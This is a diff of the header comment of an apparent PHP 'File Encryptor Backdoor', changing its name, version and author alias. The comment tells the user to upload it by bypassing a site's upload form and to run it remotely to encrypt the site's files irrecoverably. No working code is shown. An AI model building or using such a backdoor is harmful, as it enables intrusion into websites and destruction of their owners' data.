@@ -2,7 +2,7 @@
 /**
  * BEGIN CORE SECTION
  * 
- * Noplan File Encryptor Backdoor v1
+ * File Encryptor Backdoor v2.2
  *
  * Upload this file with bypassing site's form upload and Remote from browser
  * Fill the configuration form and let this file do the magic!
@@ -18,10 +18,10 @@
  * WARNING!!!
  * Guessing the decryptor key and entering it randomly will cause the encrypted file never to be recover forever
  * 
- * @package	Noplan File Encryptor
- * @author	Noplan Alderson
+ * @package	File Encryptor Backdoor
+ * @author	Noplan Alderson a.k.a Muhammad Ridwan Na'im
  * @copyright	Copyright (c) 2020 - now and forever
- * @since	Version 1.0.0
+ * @since	Version 1.0
  * @filesource
  * 
  **/
